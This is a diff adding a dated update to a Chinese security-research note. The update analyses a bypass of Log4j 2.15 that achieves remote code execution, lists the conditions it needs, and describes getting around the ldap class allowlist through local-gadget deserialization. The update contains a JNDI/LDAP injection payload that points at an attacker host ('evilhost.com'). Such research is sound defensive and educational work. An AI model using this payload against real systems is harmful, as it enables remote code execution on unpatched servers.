@@ -108,6 +108,45 @@ ${jndi:ldap://127.0.0.1#evilhost.com:1389/exp}
 
 不过环境要求比较严格而且真实环境的rce可能比较可能。。。
 
+2021/12/20更新
+
+今天看到了大哥写的bypass 2.15 rce分析简单的记录一下 https://xz.aliyun.com/t/10689
+
+利用条件
+
+1.开启lookup功能
+
+2.macos系统
+
+3.泛域名解析
+
+4.本地存在gadget
+
+该exp通过去绕过了ip限制并且可以解析远程恶意ip(macos系统
+
+```
+${jndi:ldap://127.0.0.1#evilhost.com:1389/exp}
+```
+
+然后去绕过ldap服务的限制。
+
+
+![image-20211220183446609](https://user-images.githubusercontent.com/63966847/146754506-bccfb16a-57e0-40d6-be17-36cbe67705a7.png)
+
+
+
+正常情况是直接通过Reference去利用，不过这里不能使用Reference，所以就利用deserializeObject，其实就是bypass jdk8u191。满足本地存在gadget。只是需要把classname换成基本数据类型。去绕过**if (!allowedClasses.contains(className))**
+
+也其实就是我们在了ldap的时候的思路 **LDAP服务攻击一般是先测Reference再测deserializeObject**
+
+![image-20211220183705875](https://user-images.githubusercontent.com/63966847/146754481-8d5aff45-fa12-4593-9165-ace4aa0257bd.png)
+
+
+
+
+
+
+
 ## 总结一下
 
 主要是自己的问题，
